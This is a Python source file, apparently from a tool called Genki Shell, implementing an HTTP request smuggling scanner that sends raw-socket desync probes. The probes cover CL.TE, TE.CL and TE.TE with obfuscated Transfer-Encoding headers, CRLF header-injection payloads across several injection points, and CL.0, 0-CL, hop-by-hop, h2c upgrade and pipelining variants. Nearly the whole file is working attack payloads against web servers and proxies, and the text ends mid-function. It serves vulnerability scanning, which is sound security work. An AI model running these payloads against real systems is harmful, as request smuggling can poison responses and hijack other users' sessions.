"""
HTTP Request Smuggling Scanner
Portswigger Research Techniques adapted for Genki Shell.
CL.TE, TE.CL, TE.TE, CL.0, CRLF Desync, HTTP Terminator.
Raw socket probes - works against any server/framework.
"""

import socket
import ssl
import time
import uuid
from dataclasses import dataclass, field, asdict
from typing import List, Optional
from urllib.parse import urlparse


# ---------------------------------------------------------------------------
# Result container
# ---------------------------------------------------------------------------

@dataclass
class SmuggleResult:
    technique: str
    endpoint: str
    confirmed: bool
    confidence: str  # "high", "medium", "low"
    probe_sent: str
    response_snippet: str
    timing_ms: float
    detail: str


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

_CONNECT_TIMEOUT = 8
_RECV_TIMEOUT = 10
_BASELINE_TIMEOUT = 10
_PROBE_TIMEOUT = 15
_READ_SIZE = 4096
_TIMING_THRESHOLD_MS = 3000


def _parse_target(url: str):
    """Return (host, port, path, use_tls)."""
    p = urlparse(url)
    scheme = (p.scheme or "http").lower()
    host = p.hostname or "localhost"
    use_tls = scheme == "https"
    default_port = 443 if use_tls else 80
    port = p.port or default_port
    path = p.path or "/"
    return host, port, path, use_tls


def _make_socket(host: str, port: int, use_tls: bool, timeout: float = _CONNECT_TIMEOUT):
    """Open a TCP (optionally TLS) socket to the target."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _send_recv(sock, payload: bytes, timeout: float = _RECV_TIMEOUT) -> bytes:
    """Send payload and read whatever comes back before timeout."""
    sock.settimeout(timeout)
    sock.sendall(payload)
    chunks = []
    try:
        while True:
            chunk = sock.recv(_READ_SIZE)
            if not chunk:
                break
            chunks.append(chunk)
    except (socket.timeout, OSError):
        pass
    return b"".join(chunks)


def _timed_send_recv(sock, payload: bytes, timeout: float = _RECV_TIMEOUT):
    """Send and receive, returning (response_bytes, elapsed_ms)."""
    start = time.monotonic()
    resp = _send_recv(sock, payload, timeout=timeout)
    elapsed = (time.monotonic() - start) * 1000
    return resp, elapsed


def _decode(data: bytes) -> str:
    return data.decode("utf-8", errors="replace")


def _extract_status(response: bytes) -> int:
    """Pull the HTTP status code from a raw response, or 0 on failure."""
    line = _decode(response).split("\r\n", 1)[0]
    parts = line.split(None, 2)
    if len(parts) >= 2:
        try:
            return int(parts[1])
        except ValueError:
            pass
    return 0


def _snippet(data: bytes, maxlen: int = 300) -> str:
    text = _decode(data)
    if len(text) > maxlen:
        return text[:maxlen] + "..."
    return text


def _marker():
    return uuid.uuid4().hex[:16]


def _host_header(host: str, port: int, use_tls: bool) -> str:
    default = 443 if use_tls else 80
    if port == default:
        return host
    return f"{host}:{port}"


# ---------------------------------------------------------------------------
# 1. HTTPSmuggler -- CL.TE, TE.CL, TE.TE with 12 TE obfuscations
# ---------------------------------------------------------------------------

# Transfer-Encoding obfuscation variants
_TE_VARIANTS = [
    "Transfer-Encoding: chunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
    "Transfer-Encoding:\tchunked",
    "Transfer-Encoding: chunked\r\n",
    " Transfer-Encoding: chunked",
    "Transfer-Encoding: \tchunked",
    "Transfer-Encoding\r\n : chunked",
    "Transfer-Encoding: CHUNKED",
    "Transfer-Encoding: chunked\r\nX: ",
    "Transfer-encoding: cow\r\nTransfer-Encoding: chunked",
    "Transfer-Encoding:  chunked",
]


class HTTPSmuggler:
    """
    Tests CL.TE, TE.CL, and TE.TE desync with 12 Transfer-Encoding
    obfuscation variants.  Uses timing-based detection (baseline vs probe
    comparison).  Sends probe + followup on the same keep-alive connection
    and checks if the followup response is corrupted / delayed.
    """

    def __init__(self, host: str, port: int, path: str, use_tls: bool,
                 verbose: bool = False):
        self.host = host
        self.port = port
        self.path = path
        self.use_tls = use_tls
        self.verbose = verbose
        self.results: List[SmuggleResult] = []

    # -- internal helpers --------------------------------------------------

    def _log(self, msg: str):
        if self.verbose:
            print(f"  [smuggler] {msg}")

    def _baseline(self) -> Optional[float]:
        """Get baseline timing for a normal GET to calibrate the threshold."""
        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            hdr = _host_header(self.host, self.port, self.use_tls)
            req = (
                f"GET {self.path} HTTP/1.1\r\n"
                f"Host: {hdr}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            _, ms = _timed_send_recv(sock, req, timeout=_BASELINE_TIMEOUT)
            self._log(f"baseline: {ms:.0f}ms")
            return ms
        except Exception as exc:
            self._log(f"baseline failed: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- CL.TE probe -------------------------------------------------------

    def _probe_cl_te(self, te_header: str, te_index: int) -> Optional[SmuggleResult]:
        """
        CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding.
        Send a request whose CL is shorter than the chunked body.  If the
        back-end parses chunked, the leftover poisons the next request.
        """
        marker = _marker()
        smuggled_prefix = f"G]POST /{marker} HTTP/1.1\r\nX: x"
        # Body: one chunk of 'smuggled_prefix', then a partial terminator
        # so that the back-end's TE parser waits for more data.
        chunk_hex = format(len(smuggled_prefix), "x")
        body = f"{chunk_hex}\r\n{smuggled_prefix}\r\n0\r\n\r\n"

        # CL is deliberately set shorter than the real body (just the first
        # line) so the front-end forwards the entire stream but considers
        # the request done.
        hdr = _host_header(self.host, self.port, self.use_tls)
        probe = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"{te_header}\r\n"
            f"Content-Length: 4\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        followup = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, probe, timeout=_PROBE_TIMEOUT)
            resp2, t2 = _timed_send_recv(sock, followup, timeout=_PROBE_TIMEOUT)
            total = t1 + t2

            status1 = _extract_status(resp1)
            status2 = _extract_status(resp2)
            resp2_text = _decode(resp2)

            confirmed = False
            confidence = "low"
            detail = ""

            # Detection: followup got an unexpected status or reflects marker
            if marker in resp2_text:
                confirmed = True
                confidence = "high"
                detail = f"Marker {marker} reflected in followup response"
            elif status2 != 0 and status2 not in (200, 301, 302, 304):
                if status2 in (400, 403, 405, 501):
                    confirmed = True
                    confidence = "medium"
                    detail = f"Followup returned {status2} (expected 2xx/3xx)"
            elif total > _TIMING_THRESHOLD_MS:
                confidence = "medium"
                detail = f"Timing anomaly: {total:.0f}ms (threshold {_TIMING_THRESHOLD_MS}ms)"
                confirmed = True

            if confirmed:
                return SmuggleResult(
                    technique=f"CL.TE (TE variant #{te_index})",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence=confidence,
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=detail,
                )
            return None
        except Exception as exc:
            self._log(f"CL.TE probe #{te_index} error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- TE.CL probe -------------------------------------------------------

    def _probe_te_cl(self, te_header: str, te_index: int) -> Optional[SmuggleResult]:
        """
        TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length.
        Chunked body that hides a second request after the first CL boundary.
        """
        marker = _marker()
        smuggled = (
            f"POST /{marker} HTTP/1.1\r\n"
            f"Host: {_host_header(self.host, self.port, self.use_tls)}\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x=1"
        )
        inner_len = len(smuggled)
        # Chunk encoding: one chunk containing the smuggled request
        body = f"0\r\n\r\n{smuggled}"
        # CL covers only up to and including the 0-chunk terminator
        cl_val = body.index(smuggled)

        hdr = _host_header(self.host, self.port, self.use_tls)
        probe = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Content-Length: {cl_val}\r\n"
            f"{te_header}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        followup = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, probe, timeout=_PROBE_TIMEOUT)
            resp2, t2 = _timed_send_recv(sock, followup, timeout=_PROBE_TIMEOUT)
            total = t1 + t2

            status2 = _extract_status(resp2)
            resp2_text = _decode(resp2)

            confirmed = False
            confidence = "low"
            detail = ""

            if marker in resp2_text:
                confirmed = True
                confidence = "high"
                detail = f"Marker {marker} reflected in followup response"
            elif status2 not in (0, 200, 301, 302, 304):
                confirmed = True
                confidence = "medium"
                detail = f"Followup returned {status2} instead of normal status"
            elif total > _TIMING_THRESHOLD_MS:
                confirmed = True
                confidence = "medium"
                detail = f"Timing anomaly: {total:.0f}ms"

            if confirmed:
                return SmuggleResult(
                    technique=f"TE.CL (TE variant #{te_index})",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence=confidence,
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=detail,
                )
            return None
        except Exception as exc:
            self._log(f"TE.CL probe #{te_index} error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- TE.TE probe -------------------------------------------------------

    def _probe_te_te(self, te_header: str, te_index: int) -> Optional[SmuggleResult]:
        """
        TE.TE: both endpoints support TE, but one is confused by the
        obfuscation and falls back to CL.  Send two TE headers; the one
        that is NOT obfuscated has a legitimate chunked body, the obfuscated
        one causes one endpoint to ignore TE entirely.
        """
        marker = _marker()
        hdr = _host_header(self.host, self.port, self.use_tls)

        # Body: a valid 0-length chunk + smuggled request after it
        smuggled = f"GET /{marker} HTTP/1.1\r\nHost: {hdr}\r\n\r\n"
        body = f"0\r\n\r\n{smuggled}"
        cl_val = 5  # small CL so the CL-endpoint stops reading early

        probe = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Content-Length: {cl_val}\r\n"
            f"{te_header}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        followup = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, probe, timeout=_PROBE_TIMEOUT)
            resp2, t2 = _timed_send_recv(sock, followup, timeout=_PROBE_TIMEOUT)
            total = t1 + t2

            status2 = _extract_status(resp2)
            resp2_text = _decode(resp2)

            confirmed = False
            confidence = "low"
            detail = ""

            if marker in resp2_text:
                confirmed = True
                confidence = "high"
                detail = f"Marker {marker} reflected in followup (TE.TE desync)"
            elif status2 not in (0, 200, 301, 302, 304):
                confirmed = True
                confidence = "medium"
                detail = f"Followup got {status2} after TE.TE probe"
            elif total > _TIMING_THRESHOLD_MS:
                confirmed = True
                confidence = "low"
                detail = f"Timing anomaly: {total:.0f}ms (TE.TE)"

            if confirmed:
                return SmuggleResult(
                    technique=f"TE.TE (TE variant #{te_index})",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence=confidence,
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=detail,
                )
            return None
        except Exception as exc:
            self._log(f"TE.TE probe #{te_index} error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- public API --------------------------------------------------------

    def scan(self) -> List[SmuggleResult]:
        """Run all CL.TE, TE.CL, TE.TE probes.  Stop early per technique."""
        self._log("starting CL.TE / TE.CL / TE.TE scan")
        baseline = self._baseline()
        if baseline is None:
            self._log("could not establish baseline, aborting")
            return self.results

        for name, probe_fn in [
            ("CL.TE", self._probe_cl_te),
            ("TE.CL", self._probe_te_cl),
            ("TE.TE", self._probe_te_te),
        ]:
            for idx, te_hdr in enumerate(_TE_VARIANTS):
                result = probe_fn(te_hdr, idx)
                if result:
                    self.results.append(result)
                    self._log(f"{name} confirmed with TE variant #{idx}")
                    break  # stop on first confirmed desync for this technique

        return self.results


# ---------------------------------------------------------------------------
# 2. CRLFDesyncScanner -- CRLF injection across 7 injection points
# ---------------------------------------------------------------------------

# Injection points
_CRLF_INJECTION_POINTS = [
    "path",
    "host",
    "referer",
    "x-forwarded-for",
    "user-agent",
    "cookie",
    "custom",
]

# Payload templates -- {marker} is replaced per probe
_CRLF_PAYLOADS = [
    # Basic CRLF
    "\r\nX-Injected-{marker}: true",
    # Double-encoded
    "%0d%0aX-Injected-{marker}: true",
    # UTF-8 CRLF variant (\xc4\x8d = latin small c with caron, used by
    # some parsers as CRLF lookalike)
    "\xc4\x8d\xc4\x8aX-Injected-{marker}: true",
    # Bare LF
    "\nX-Injected-{marker}: true",
    # Null byte + CRLF
    "\x00\r\nX-Injected-{marker}: true",
    # TE injection via CRLF
    "\r\nTransfer-Encoding: chunked",
    # CL injection via CRLF
    "\r\nContent-Length: 0\r\n\r\nGET /{marker} HTTP/1.1\r\nHost: x",
    # Header termination
    "\r\n\r\nGET /{marker} HTTP/1.1\r\nHost: x\r\n\r\n",
    # Unicode line separator U+2028
    " X-Injected-{marker}: true",
]


class CRLFDesyncScanner:
    """
    Tests CRLF injection across 7 injection points with 9 payload types
    including UTF-8 CRLF variants and TE/CL injection.
    """

    def __init__(self, host: str, port: int, path: str, use_tls: bool,
                 verbose: bool = False):
        self.host = host
        self.port = port
        self.path = path
        self.use_tls = use_tls
        self.verbose = verbose
        self.results: List[SmuggleResult] = []

    def _log(self, msg: str):
        if self.verbose:
            print(f"  [crlf-desync] {msg}")

    def _build_request(self, injection_point: str, payload: str,
                       marker: str) -> bytes:
        """Build a raw HTTP request with the payload injected at the
        given injection point."""
        hdr = _host_header(self.host, self.port, self.use_tls)

        host_val = hdr
        path_val = self.path
        referer_val = f"http://{hdr}{self.path}"
        xff_val = "127.0.0.1"
        ua_val = "Genki-Shell/1.0"
        cookie_val = f"sess={marker}"
        custom_hdr = ""

        if injection_point == "path":
            path_val = self.path + payload
        elif injection_point == "host":
            host_val = hdr + payload
        elif injection_point == "referer":
            referer_val = referer_val + payload
        elif injection_point == "x-forwarded-for":
            xff_val = "127.0.0.1" + payload
        elif injection_point == "user-agent":
            ua_val = ua_val + payload
        elif injection_point == "cookie":
            cookie_val = cookie_val + payload
        elif injection_point == "custom":
            custom_hdr = f"X-Custom: value{payload}\r\n"

        req = (
            f"GET {path_val} HTTP/1.1\r\n"
            f"Host: {host_val}\r\n"
            f"User-Agent: {ua_val}\r\n"
            f"Referer: {referer_val}\r\n"
            f"X-Forwarded-For: {xff_val}\r\n"
            f"Cookie: {cookie_val}\r\n"
            f"{custom_hdr}"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )

        # Encode carefully: the payload may contain raw bytes
        try:
            return req.encode("utf-8")
        except UnicodeEncodeError:
            return req.encode("latin-1", errors="replace")

    def _probe(self, injection_point: str, payload_template: str) -> Optional[SmuggleResult]:
        marker = _marker()
        payload = payload_template.replace("{marker}", marker)
        probe_bytes = self._build_request(injection_point, payload, marker)

        followup = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {_host_header(self.host, self.port, self.use_tls)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, probe_bytes, timeout=_PROBE_TIMEOUT)
            resp2, t2 = _timed_send_recv(sock, followup, timeout=_PROBE_TIMEOUT)
            total = t1 + t2

            resp1_text = _decode(resp1)
            resp2_text = _decode(resp2)
            status1 = _extract_status(resp1)
            status2 = _extract_status(resp2)

            confirmed = False
            confidence = "low"
            detail = ""

            # Check: injected header reflected in response
            injected_hdr = f"X-Injected-{marker}"
            if injected_hdr in resp1_text:
                confirmed = True
                confidence = "high"
                detail = f"Injected header '{injected_hdr}' reflected in response"
            elif marker in resp2_text:
                confirmed = True
                confidence = "high"
                detail = f"Marker {marker} in followup response (desync achieved)"
            elif status2 not in (0, 200, 301, 302, 304):
                # Followup got a weird status -- possible desync
                if "Transfer-Encoding" in payload_template or "Content-Length" in payload_template:
                    confirmed = True
                    confidence = "medium"
                    detail = f"Followup status {status2} after TE/CL CRLF injection"
            elif total > _TIMING_THRESHOLD_MS:
                confirmed = True
                confidence = "low"
                detail = f"Timing anomaly: {total:.0f}ms after CRLF injection"

            if confirmed:
                return SmuggleResult(
                    technique=f"CRLF Desync ({injection_point})",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence=confidence,
                    probe_sent=_snippet(probe_bytes),
                    response_snippet=_snippet(resp1 + b"\n---FOLLOWUP---\n" + resp2),
                    timing_ms=total,
                    detail=detail,
                )
            return None
        except Exception as exc:
            self._log(f"CRLF probe error ({injection_point}): {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    def scan(self) -> List[SmuggleResult]:
        self._log("starting CRLF desync scan")
        for point in _CRLF_INJECTION_POINTS:
            found = False
            for payload_tmpl in _CRLF_PAYLOADS:
                result = self._probe(point, payload_tmpl)
                if result:
                    self.results.append(result)
                    self._log(f"CRLF confirmed at injection point '{point}'")
                    found = True
                    break  # stop on first confirmed for this injection point
            if found:
                continue  # move to next injection point
        return self.results


# ---------------------------------------------------------------------------
# 3. HTTPTerminator -- advanced desync: CL.0, 0-CL, hop-by-hop TE,
#    H2C upgrade, connection-state abuse, response queue poisoning,
#    half-close abuse
# ---------------------------------------------------------------------------

class HTTPTerminator:
    """
    Tests CL.0 (server ignores CL, body becomes next request), 0-CL
    (CL:0 with body), hop-by-hop TE stripping, H2 path pollution via
    H2C upgrade, connection-state abuse, response queue poisoning via
    pipelining, and half-close abuse.
    """

    def __init__(self, host: str, port: int, path: str, use_tls: bool,
                 verbose: bool = False):
        self.host = host
        self.port = port
        self.path = path
        self.use_tls = use_tls
        self.verbose = verbose
        self.results: List[SmuggleResult] = []

    def _log(self, msg: str):
        if self.verbose:
            print(f"  [terminator] {msg}")

    # -- CL.0 --------------------------------------------------------------

    def _probe_cl0(self) -> Optional[SmuggleResult]:
        """
        CL.0: send a POST with Content-Length: <N> but append extra data
        after the CL boundary.  If the server ignores CL and reads until
        connection close, the extra data is treated as the next request.
        """
        marker = _marker()
        hdr = _host_header(self.host, self.port, self.use_tls)
        body = "x=1"
        smuggled = f"GET /{marker} HTTP/1.1\r\nHost: {hdr}\r\n\r\n"

        probe = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
            f"{smuggled}"
        ).encode()

        followup = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, probe, timeout=_PROBE_TIMEOUT)
            resp2, t2 = _timed_send_recv(sock, followup, timeout=_PROBE_TIMEOUT)
            total = t1 + t2
            resp2_text = _decode(resp2)
            status2 = _extract_status(resp2)

            if marker in resp2_text:
                return SmuggleResult(
                    technique="CL.0",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="high",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=f"CL.0 desync: marker {marker} reflected in followup",
                )
            elif status2 not in (0, 200, 301, 302, 304):
                return SmuggleResult(
                    technique="CL.0",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="medium",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=f"CL.0 possible: followup got {status2}",
                )
            return None
        except Exception as exc:
            self._log(f"CL.0 error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- 0-CL ---------------------------------------------------------------

    def _probe_0cl(self) -> Optional[SmuggleResult]:
        """
        0-CL: send Content-Length: 0 but include a body.  Some servers
        honour the header and ignore the body; a proxy that reads the body
        will forward it as the next request.
        """
        marker = _marker()
        hdr = _host_header(self.host, self.port, self.use_tls)
        smuggled = f"GET /{marker} HTTP/1.1\r\nHost: {hdr}\r\n\r\n"

        probe = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Content-Length: 0\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode()

        followup = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, probe, timeout=_PROBE_TIMEOUT)
            resp2, t2 = _timed_send_recv(sock, followup, timeout=_PROBE_TIMEOUT)
            total = t1 + t2
            resp2_text = _decode(resp2)
            status2 = _extract_status(resp2)

            if marker in resp2_text:
                return SmuggleResult(
                    technique="0-CL",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="high",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=f"0-CL desync: marker {marker} in followup",
                )
            elif status2 not in (0, 200, 301, 302, 304):
                return SmuggleResult(
                    technique="0-CL",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="medium",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=f"0-CL possible: followup status {status2}",
                )
            return None
        except Exception as exc:
            self._log(f"0-CL error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- Hop-by-hop TE stripping -------------------------------------------

    def _probe_hop_by_hop(self) -> Optional[SmuggleResult]:
        """
        Ask the proxy to strip Transfer-Encoding via Connection header
        hop-by-hop list.  If successful the back-end never sees TE and
        falls back to CL.
        """
        marker = _marker()
        hdr = _host_header(self.host, self.port, self.use_tls)
        smuggled = f"GET /{marker} HTTP/1.1\r\nHost: {hdr}\r\n\r\n"
        body = f"0\r\n\r\n{smuggled}"

        probe = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: keep-alive, Transfer-Encoding\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        followup = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, probe, timeout=_PROBE_TIMEOUT)
            resp2, t2 = _timed_send_recv(sock, followup, timeout=_PROBE_TIMEOUT)
            total = t1 + t2
            resp2_text = _decode(resp2)
            status2 = _extract_status(resp2)

            if marker in resp2_text:
                return SmuggleResult(
                    technique="Hop-by-hop TE stripping",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="high",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=f"Hop-by-hop TE stripping: marker {marker} in followup",
                )
            elif status2 not in (0, 200, 301, 302, 304):
                return SmuggleResult(
                    technique="Hop-by-hop TE stripping",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="medium",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=f"Hop-by-hop TE strip possible: followup {status2}",
                )
            return None
        except Exception as exc:
            self._log(f"Hop-by-hop error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- H2C upgrade path pollution ----------------------------------------

    def _probe_h2c_upgrade(self) -> Optional[SmuggleResult]:
        """
        Attempt an HTTP/2 cleartext (h2c) upgrade.  Some proxies blindly
        tunnel the upgraded connection, allowing path pollution.
        """
        marker = _marker()
        hdr = _host_header(self.host, self.port, self.use_tls)

        probe = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp, elapsed = _timed_send_recv(sock, probe, timeout=_PROBE_TIMEOUT)
            status = _extract_status(resp)
            resp_text = _decode(resp)

            if status == 101:
                return SmuggleResult(
                    technique="H2C upgrade path pollution",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="high",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp),
                    timing_ms=elapsed,
                    detail="Server accepted h2c upgrade (101 Switching Protocols)",
                )
            elif "upgrade" in resp_text.lower() and status in (200, 301, 302):
                return SmuggleResult(
                    technique="H2C upgrade path pollution",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="low",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp),
                    timing_ms=elapsed,
                    detail=f"H2C upgrade echoed (status {status}), possible tunnel",
                )
            return None
        except Exception as exc:
            self._log(f"H2C error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- Connection-state abuse ---------------------------------------------

    def _probe_connection_state(self) -> Optional[SmuggleResult]:
        """
        Send a valid request followed by an invalid one on the same
        keep-alive connection.  If the server's connection state leaks
        (e.g. auth or routing from request 1 applies to request 2),
        it indicates connection-state abuse.
        """
        marker = _marker()
        hdr = _host_header(self.host, self.port, self.use_tls)

        # First: normal request to a valid path
        req1 = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()

        # Second: request to a different (marker) path
        req2 = (
            f"GET /{marker} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp1, t1 = _timed_send_recv(sock, req1, timeout=_PROBE_TIMEOUT)
            status1 = _extract_status(resp1)

            # Now try a second request that should be independent
            resp2, t2 = _timed_send_recv(sock, req2, timeout=_PROBE_TIMEOUT)
            status2 = _extract_status(resp2)
            resp2_text = _decode(resp2)
            total = t1 + t2

            # If response 2 leaks state from response 1 (e.g. same auth
            # cookies, same routing path content), flag it
            if status1 == 200 and status2 == 200 and marker not in resp2_text:
                # Response 2 returned 200 for a path that should not exist
                # AND doesn't contain the marker in the URL reflection --
                # could be the server reusing state from connection 1
                return SmuggleResult(
                    technique="Connection-state abuse",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="low",
                    probe_sent=_decode(req1 + req2),
                    response_snippet=_snippet(resp2),
                    timing_ms=total,
                    detail=f"Second request to /{marker} got 200 (possible state leak)",
                )
            return None
        except Exception as exc:
            self._log(f"Connection-state error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- Response queue poisoning via pipelining ---------------------------

    def _probe_pipeline_poison(self) -> Optional[SmuggleResult]:
        """
        Send two pipelined requests in one TCP write.  If the server
        misaligns responses to requests, the second caller gets the
        first caller's response (response queue poisoning).
        """
        marker1 = _marker()
        marker2 = _marker()
        hdr = _host_header(self.host, self.port, self.use_tls)

        # Two requests back-to-back
        req1 = (
            f"GET {self.path}?q={marker1} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        req2 = (
            f"GET {self.path}?q={marker2} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        pipeline = (req1 + req2).encode()

        sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            resp, elapsed = _timed_send_recv(sock, pipeline, timeout=_PROBE_TIMEOUT)
            resp_text = _decode(resp)

            # Split the response by HTTP/1. boundaries
            parts = resp_text.split("HTTP/1.")
            if len(parts) >= 3:
                # We got at least two HTTP responses
                # Check if marker2 appears in the first response or
                # marker1 in the second
                first_resp = parts[1]
                second_resp = parts[2] if len(parts) > 2 else ""

                if marker2 in first_resp or marker1 in second_resp:
                    return SmuggleResult(
                        technique="Response queue poisoning (pipeline)",
                        endpoint=f"{self.host}:{self.port}{self.path}",
                        confirmed=True,
                        confidence="medium",
                        probe_sent=_decode(pipeline),
                        response_snippet=_snippet(resp),
                        timing_ms=elapsed,
                        detail="Response queue misalignment detected via pipelining",
                    )
            return None
        except Exception as exc:
            self._log(f"Pipeline poisoning error: {exc}")
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass

    # -- Half-close abuse ---------------------------------------------------

    def _probe_half_close(self) -> Optional[SmuggleResult]:
        """
        Send a request, then shutdown the write side of the socket
        (half-close).  Some servers/proxies treat the TCP FIN as a
        request terminator and process trailing data as a new request.
        """
        marker = _marker()
